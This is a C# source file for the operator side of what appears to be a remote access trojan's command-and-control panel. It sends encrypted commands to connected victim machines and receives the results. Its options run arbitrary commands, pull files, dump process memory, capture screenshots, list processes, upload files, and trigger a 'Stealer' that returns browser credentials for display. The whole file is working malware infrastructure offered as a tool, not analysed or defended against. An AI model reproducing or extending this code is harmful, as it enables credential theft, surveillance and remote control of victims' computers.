using Server_side.UserControls;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ProgressBar;

namespace Server_side
{
    public partial class ClientInfo : Form
    {
        private Dictionary<Socket, String> client;
        private Socket clientSocket;
        private string passPhrase;
        private Encryptor encryptor;
        private string delimiter = "|;|";
        public ClientInfo(string clientIP, string clientHostname, string connectTime, string clientOS)
        {
            InitializeComponent();
            ipLabel.Text = clientIP;
            hostnameLabel.Text = clientHostname;
            contimeLabel.Text = connectTime;
            osLabel.Text = clientOS;

            client = NetworkLayer.clientList.SelectMany(dict => dict)
                .Where(kvp => kvp.Key.RemoteEndPoint.ToString().Contains(clientIP))
                .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

            clientSocket = client.Keys.First();
            passPhrase = client.Values.First();

            InitializeSavedValues(clientIP);
            agentLogBox.TextChanged += agentLogBox_TextChanged;

            cmdComboBox.Items.Clear();
            cmdComboBox.Items.Add("Get File");
            cmdComboBox.Items.Add("Get SystemInfo");
            cmdComboBox.Items.Add("Get ProcessDump");
            cmdComboBox.Items.Add("Get Screenshot");
            cmdComboBox.Items.Add("Get ProcessList");
            cmdComboBox.Items.Add("Stealer");
            cmdComboBox.Items.Add("Upload File");
            cmdComboBox.Items.Add("Exit");
            cmdComboBox.SelectedIndex = 0;

            encryptor = new(passPhrase.Trim());
        }

        // Keeping agent log in the settings
        private void InitializeSavedValues(string clientIP)
        {
            string uid = $"{clientIP}_{passPhrase}";

            try
            {
                if (!Program.mySettings.Properties.Cast<System.Configuration.SettingsProperty>().Any(prop => prop.Name == uid))
                {
                    var newProperty = new System.Configuration.SettingsProperty(uid)
                    {
                        DefaultValue = string.Empty
                    };
                    Program.mySettings.Properties.Add(newProperty);
                    Program.mySettings.Save();
                }

                agentLogBox.Text = Program.mySettings.Properties[uid].DefaultValue.ToString();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error in InitializeSavedValues: " + e.Message);
            }
        }


        private void agentLogBox_TextChanged(object sender, EventArgs e)
        {
            Program.mySettings.Properties[$"{ipLabel.Text}_{passPhrase}"].DefaultValue = agentLogBox.Text;
            Program.mySettings.Save();
        }

        private void sendCommandBtn_Click(object sender, EventArgs e)
        {
            string command = $"1{delimiter}{commandBox.Text}";

            keyLabel.Text = encryptor.GetKey();
            ivLabel.Text = encryptor.GetIV();
            passLabel.Text = passPhrase;

            byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
            NetworkLayer.Send(clientSocket, encryptedCommand);

            logging("Command sent|---|" + commandBox.Text);

            // Receive response
            byte[] response = NetworkLayer.ReceiveResult(clientSocket);
            string decryptedResponse = encryptor.Decrypt(response);
            logging("Response received|---|" + decryptedResponse);

            commandBox.Text = "";
        }

        private void logging(string log)
        {
            if (log == null)
            {
                return;
            }

            string[] parts = log.Split("|---|");
            string boldText = $"{parts[0]}: ";
            // Set bold text to blue color
            agentLogBox.SelectionStart = agentLogBox.TextLength;
            agentLogBox.SelectionLength = boldText.Length;
            agentLogBox.SelectionColor = Color.Blue;
            agentLogBox.SelectionFont = new Font(agentLogBox.Font, FontStyle.Bold);
            agentLogBox.AppendText(boldText);
            // Set the rest of the text to black color
            agentLogBox.SelectionStart = agentLogBox.TextLength;
            agentLogBox.SelectionLength = log.Length - boldText.Length;
            agentLogBox.SelectionColor = Color.Black;

            if (boldText.Contains("received"))
            {
                agentLogBox.AppendText(Environment.NewLine);
            }

            agentLogBox.AppendText(parts[1] + Environment.NewLine);
        }

        private void sendCommandBtn1_Click(object sender, EventArgs e)
        {
            string placeholder;
            switch (cmdComboBox.SelectedIndex)
            {
                case 0:
                    {
                        placeholder = agentfileBox.Text;
                        if (string.IsNullOrEmpty(placeholder))
                        {
                            MessageBox.Show("Please enter a file path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        try
                        {
                            byte[] file = GetResultFile(true);
                            MessageBox.Show("File received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        catch (Exception ex)
                        {
                            logging("Error when receiving the file|---|" + ex.Message);
                            MessageBox.Show("Error when receiving the file: " + ex.Message);
                        }
                        break;
                    }
                case 1:
                    {
                        placeholder = "getsysteminfo";

                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        byte[] response = GetResultFile(false);
                        logging("Response received|---|" + Encoding.UTF8.GetString(response));

                        MessageBox.Show("System information received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);

                        DisplaySystemInfo displaySystemInfo = new DisplaySystemInfo(Encoding.UTF8.GetString(response));
                        displaySystemInfo.Show();

                        break;
                    }
                case 2:
                    {
                        placeholder = pidBox.Text;
                        if (string.IsNullOrEmpty(placeholder))
                        {
                            MessageBox.Show("Please enter a PID.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        try
                        {
                            byte[] dump = GetResultFile(true);
                            MessageBox.Show("Process dump received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        catch (Exception ex)
                        {
                            logging("Error when receiving the process dump|---|" + ex.Message);
                            MessageBox.Show("Error when receiving the process dump: " + ex.Message);
                        }
                        break;
                    }
                case 3:
                    {
                        placeholder = "getscreenshot";
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        try
                        {
                            byte[] image = GetResultFile(false);
                            MessageBox.Show("Screenshot received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            if (image != null && image.Length > 0)
                            {
                                using (MemoryStream ms = new MemoryStream(image))
                                {
                                    Image img = Image.FromStream(ms);
                                    DisplayScreenshot displayScreenshot = new DisplayScreenshot(img);
                                    displayScreenshot.Show();
                                }
                            }
                            else
                            {
                                logging("Error when receiving the screenshot.");
                            }
                        }
                        catch (Exception ex)
                        {
                            logging("Error displaying image");
                            MessageBox.Show("Error displaying image: " + ex.Message);
                        }
                        break;
                    }
                case 4:
                    {
                        placeholder = "getprocesslist";
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        byte[]? response = GetResultFile(false);
                        logging("Response received|---|" + Encoding.UTF8.GetString(response));

                        MessageBox.Show("Process list received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);

                        DisplayPSList displayPSList = new DisplayPSList(Encoding.UTF8.GetString(response));
                        displayPSList.Show();

                        break;
                    }
                case 5:
                    {
                        placeholder = "stealer";
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        byte[] response = GetResultFile(false);
                        logging("Response received|---|" + Encoding.UTF8.GetString(response));

                        if (Encoding.UTF8.GetString(response).Contains("Decrypt failed!") || Encoding.UTF8.GetString(response).Contains("Browser not supported!"))
                        {
                            break;
                        }

                        MessageBox.Show("Stealer executed successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);

                        DisplayCreds displayCreds = new DisplayCreds(Encoding.UTF8.GetString(response));
                        displayCreds.Show();
                        break;
                    }
                case 6:
                    {
                        placeholder = localfileBox.Text;
                        if (string.IsNullOrEmpty(placeholder))
                        {
                            MessageBox.Show("Please enter a file path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        SendFile().Wait();

                        byte[] response = NetworkLayer.ReceiveResult(clientSocket);
                        string decryptedResponse = encryptor.Decrypt(response);
                        logging("Response received|---|" + decryptedResponse);

                        break;
                    }
                case 7:
                    {
                        placeholder = "exit";
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        byte[] response = NetworkLayer.ReceiveResult(clientSocket);
                        string decryptedResponse = encryptor.Decrypt(response);
                        logging("Response received|---|" + decryptedResponse);

                        MessageBox.Show("Client will be disconnected.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        this.Close();
                        break;
                    }
            }
        }

        private byte[]? GetResultFile(bool saved)
        {
            byte[] received = NetworkLayer.ReceiveResult(clientSocket);
            string decrypted = encryptor.Decrypt(received);
            string[] parts = decrypted.Split(delimiter);

            string guid = parts[0];
            int chunkCount = int.Parse(parts[1]);
            string fileName = parts[2];

            logging($"File received|---|{fileName}_{guid}_{chunkCount}");

            List<string> tempChunks = new List<string>();
            ConcurrentDictionary<int, string> chunks = new ConcurrentDictionary<int, string>();

            string endSignal = "<END - EOF>";

            while (true)
            {
                byte[] chunk = NetworkLayer.ReceiveResult(clientSocket);
                string chunkDecrypted = encryptor.Decrypt(chunk);

                if (chunkDecrypted.Contains(endSignal))
                {
                    break;
                }

                string[] chunkParts = chunkDecrypted.Split(delimiter);
                if (chunkParts.Length >= 3)
                {
                    int chunkIndex;
                    if (int.TryParse(chunkParts[2], out chunkIndex))
                    {
                        string chunkData = chunkParts[1];
                        tempChunks.Add(chunkDecrypted);
                        chunks.TryAdd(chunkIndex, chunkData);
                    }
                    else
                    {
                        MessageBox.Show($"Error in parsing chunk index: {chunkDecrypted}");
                    }
                }
                else
                {
                    MessageBox.Show($"Error in chunk format: {chunkDecrypted}");
                }
            }

            if (chunks.Count != chunkCount)
            {
                MessageBox.Show("Error in GetResultFile: Chunk count mismatch", $"{chunks.Count} != {chunkCount}");
                return Encoding.UTF8.GetBytes("Error in GetResultFile: Chunk count mismatch");
            }

            string fileBase64 = string.Join("", chunks.OrderBy(kv => kv.Key).Select(kv => kv.Value));
            byte[] fileData = Encryptor.InvertStr(fileBase64);

            if (saved)
            {
                // Get file name instead of the full path
                fileName = Path.GetFileName(fileName);
                string filePath = Path.Combine(Program.myConfigs.AppSettings.Settings["DownloadFolder"].Value, fileName);
                File.WriteAllBytes(filePath, fileData);
                MessageBox.Show($"File saved to {filePath}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }

            return fileData;
        }

        private async Task SendFile()
        {
            byte[] fileContent;
            int MaxChunkSize = 4096;
            int counter = 0;
            List<Task> tasks = new();
            SemaphoreSlim semaphore = new SemaphoreSlim(50);
            try
            {
                fileContent = File.ReadAllBytes(localfileBox.Text);
                string fileContent64 = Encryptor.ConvertStr(fileContent);
                string fileID = Guid.NewGuid().ToString();
                string fileName = Path.GetFileName(localfileBox.Text);
                int chunkCount = (int)Math.Ceiling((double)fileContent64.Length / MaxChunkSize);
                // Send file ID, chunk count and file name
                string fileHeader = $"{fileID}{delimiter}{chunkCount}{delimiter}{fileName}{delimiter}";
                byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                NetworkLayer.Send(clientSocket, encryptedHeader);

                // Send file content
                for (int i = 0; i < fileContent64.Length; i += MaxChunkSize)
                {
                    int currentCounter = counter;
                    await semaphore.WaitAsync();
                    var chunk = fileContent64.Substring(i, Math.Min(MaxChunkSize, fileContent64.Length - i));
                    Task task = Task.Run(async () =>
                    {
                        try
                        {
                            string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{currentCounter}{delimiter}";
                            byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
                            NetworkLayer.Send(clientSocket, encryptedChunk);
                            await Task.Delay(200);
                        }
                        finally
                        {
                            semaphore.Release();
                        }
                    });
                    counter++;
                }

                await Task.WhenAll(tasks.ToArray());
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
                return;
            }
        }

        private void cmdComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (cmdComboBox.SelectedIndex)
            {
                case 0:
                    {
                        agentfileBox.Enabled = true;
                        pidBox.Enabled = false;
                        localfileBox.Enabled = false;
                        break;
                    }
                case 1:
                    {
                        agentfileBox.Enabled = false;
                        pidBox.Enabled = false;
                        localfileBox.Enabled = false;
                        break;
                    }
                case 2:
                    {
                        agentfileBox.Enabled = false;
                        pidBox.Enabled = true;
                        localfileBox.Enabled = false;
                        break;
                    }
                case 3:
                    {
                        agentfileBox.Enabled = false;
                        pidBox.Enabled = false;
                        localfileBox.Enabled = false;
                        break;
                    }
                case 4:
                    {
                        agentfileBox.Enabled = false;
                        pidBox.Enabled = false;
                        localfileBox.Enabled = false;
                        break;
                    }
                case 5:
                    {
                        agentfileBox.Enabled = false;
                        pidBox.Enabled = false;
                        localfileBox.Enabled = false;
                        break;
                    }
                case 6:
                    {
                        agentfileBox.Enabled = false;
                        pidBox.Enabled = false;
                        localfileBox.Enabled = true;
                        break;
                    }
                case 7:
                    {
                        agentfileBox.Enabled = false;
                        pidBox.Enabled = false;
                        localfileBox.Enabled = false;
                        break;
                    }
            }
        }

        private void clearLogBtn_Click(object sender, EventArgs e)
        {
            agentLogBox.Clear();
        }

        private void fileChooseBtn_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.Filter = "All files (*.*)|*.*";
            dialog.Title = "Select a file";
            dialog.Multiselect = false;
            dialog.CheckFileExists = true;
            dialog.CheckPathExists = true;
            dialog.ShowDialog();

            if (!string.IsNullOrEmpty(dialog.FileName))
            {
                localfileBox.Text = dialog.FileName;
            }
        }
    }

}
